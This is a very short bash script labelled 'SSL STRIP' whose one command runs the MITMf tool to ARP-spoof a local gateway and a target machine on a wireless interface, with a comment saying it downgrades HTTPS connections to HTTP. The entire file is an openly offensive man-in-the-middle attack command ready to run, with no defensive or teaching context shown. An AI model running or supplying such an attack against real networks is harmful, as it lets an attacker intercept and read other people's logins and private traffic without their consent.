#!/bin/bash

####################
#     SSL STRIP    #
####################

# Redirects traffic to http version of https website, i.e., downgrades it

mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.178 -i wlan0
